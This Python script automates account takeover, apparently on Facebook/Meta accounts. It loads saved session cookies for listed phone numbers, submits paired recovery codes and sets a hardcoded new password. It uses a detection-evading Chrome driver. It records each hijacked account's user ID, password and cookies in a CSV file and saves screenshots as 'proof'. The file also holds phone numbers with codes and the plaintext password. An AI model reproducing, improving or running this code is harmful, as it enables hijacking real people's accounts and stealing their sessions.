import undetected_chromedriver as uc
from selenium.webdriver.common.by import By
from selenium.webdriver.support.ui import WebDriverWait
from selenium.webdriver.support import expected_conditions as EC
import os, csv, time
import unicodedata
from datetime import datetime
from concurrent.futures import ThreadPoolExecutor, as_completed
from selenium.common.exceptions import StaleElementReferenceException, NoSuchElementException


def normalize_text(s: str) -> str:
    # Replace smart quotes, dashes, etc.
    replacements = {
        "’": "'", "‘": "'", "‛": "'", "‚": "'",
        "“": '"', "”": '"', "„": '"', "‟": '"',
        "–": "-", "—": "-", "―": "-",
        "…": "...",
    }
    for k, v in replacements.items():
        s = s.replace(k, v)

    # Normalize and reduce to ASCII
    s = unicodedata.normalize("NFKD", s)
    s = s.encode("ascii", "ignore").decode("ascii")
    return s.strip().lower()


def wait_for_any_text(driver, text_list, max_time):
    """Wait for any text from a list to appear on the page"""
    start_time = time.time()

    while time.time() - start_time < max_time:
        try:
            page_content = driver.page_source
            for text in text_list:
                if normalize_text(text) in normalize_text(page_content):
                    print(f"Searched \"{text}\"")
                    return text
            time.sleep(0.3)
        except:
            time.sleep(0.3)

    return None


def find_first_existing_xpath(driver, xpaths, timeout=30, interval=0.5):
    """
    Repeatedly check multiple XPath elements until one is visible or timeout reached.
    Returns index of first element found and visible, or -1 if none found.
    Handles page redirects and stale element references.
    """
    start = time.time()

    while time.time() - start < timeout:
        try:
            # Check each xpath in sequence
            for i, xpath in enumerate(xpaths):
                try:
                    elem = driver.find_element(By.XPATH, xpath)
                    if elem.is_displayed():
                        print(f"Found element at index {i}: {xpath[:50]}...")
                        return i
                except (NoSuchElementException, StaleElementReferenceException):
                    # Element not found or stale, continue to next xpath
                    pass
                except Exception as e:
                    # Log other exceptions but continue checking
                    pass

            # Wait before checking again
            time.sleep(interval)
        except Exception as e:
            # Handle any other errors (like page not loaded)
            time.sleep(interval)

    print(f"No elements found after {timeout} seconds")
    return -1


PASSWORD = "#Akash@1234"

otps = """
996505161961  86530329
996505168505  15425612
996505169298  034692
996505160864  46236503
996505166660  933901
"""

for line in otps.strip().split("\n"):
    parts = line.split()
    if len(parts) != 2:
        continue

    number, otp = parts

    try:
        with open(f"../fbpanel/collection/{number}.txt", "r") as f:
            lines = f.readlines()
            url = lines[0].strip()
            cookies_str = lines[1].strip()

        # Create a Chrome instance
        driver = uc.Chrome()

        # First navigate to the domain to set cookies
        domain = url.split("/")[2]  # Extract domain from URL
        driver.get(f"https://{domain}")

        # Parse and add cookies
        cookie_pairs = cookies_str.split(";")
        for cookie_pair in cookie_pairs:
            cookie_pair = cookie_pair.strip()
            if "=" in cookie_pair:
                name, value = cookie_pair.split("=", 1)
                driver.add_cookie({
                    "name": name.strip(),
                    "value": value.strip(),
                    "domain": domain if not domain.startswith("www.") else domain[4:]
                })
        print("Cookies loaded")

        # Now navigate to the actual URL with cookies loaded
        driver.get(url)

        # Fill in OTP
        input("Press enter to continue")
        otp_field = WebDriverWait(driver, 30).until(
            EC.presence_of_element_located((By.ID, "recovery_code_entry"))
        )
        otp_field.send_keys(otp)
        print("OTP entered")

        # Click Continue button
        continue_btn = WebDriverWait(driver, 30).until(
            EC.element_to_be_clickable((By.XPATH,
                                        "//button[@name='reset_action' and translate(text(), 'ABCDEFGHIJKLMNOPQRSTUVWXYZ', 'abcdefghijklmnopqrstuvwxyz')='continue']"))
        )
        continue_btn.click()
        print("Continue button clicked")

        # Add a brief wait for page transition to start
        time.sleep(1)

        warnings = find_first_existing_xpath(driver, [
            "//img[contains(@src, 'F3-2FA-Notifications-Mobile_light-3x.png')]",
            "//*[contains(translate(text(), 'ABCDEFGHIJKLMNOPQRSTUVWXYZ', 'abcdefghijklmnopqrstuvwxyz'), \"doesn't match\")]",
            "//*[@id='password_new']"
        ], timeout=30)

        # /images/assets_DO_NOT_HARDCODE/xmds_f3_meta_account/F3-2FA-Notifications-Mobile_light-3x.png

        if warnings == 0:
            print("2FA authenticator")
            driver.quit()
            continue

        if warnings == 1:
            print("OTP doesn't match")
            driver.quit()
            continue

        if warnings == 2:
            print("Proceeding to password reset")

        if warnings == -1:
            print("Something went wrong")
            input("Press enter to look whats went wrong")

        # Fill in new password
        input("Press enter to continue")
        password_field = WebDriverWait(driver, 60).until(
            EC.presence_of_element_located((By.XPATH, "//*[@id='password_new']"))
        )
        password_field.send_keys(PASSWORD)
        print("Password entered")

        # Click continue button
        btn_continue = WebDriverWait(driver, 30).until(
            EC.element_to_be_clickable((By.ID, "btn_continue"))
        )
        btn_continue.click()
        print("Continue button clicked (password page)")

        # Check for success by finding Messenger element
        try:
            input("Press enter to continue")
            messenger_element = WebDriverWait(driver, 30).until(
                EC.presence_of_element_located((By.XPATH, "//*[@aria-label='Messenger']"))
            )
            print("SUCCESS: Password reset completed!")

            # Save cookies
            cookies = driver.get_cookies()
            user = driver.get_cookie("c_user").get("value")
            cookie_str = ";".join([f"{c['name']}={c['value']}" for c in cookies])

            # Append info into csv file
            file_exists = os.path.exists("accounts.csv")
            with open("accounts.csv", "a", newline="", encoding="utf-8") as f:
                writer = csv.writer(f)
                if not file_exists:
                    writer.writerow(["User", "Password", "Cookies"])
                writer.writerow([user, PASSWORD, cookie_str])
            print("Data saved to CSV")
        except:
            print("Messenger element not found - password reset may have failed")

        # Take screenshot
        os.makedirs("proof", exist_ok=True)
        screenshot_file = f"proof/{number}_{otp}.png"
        driver.save_screenshot(screenshot_file)
        print(f"Screenshot saved as {screenshot_file}")

        driver.quit()
    except Exception as e:
        print(f"An error occurred for number {number}: {e}")
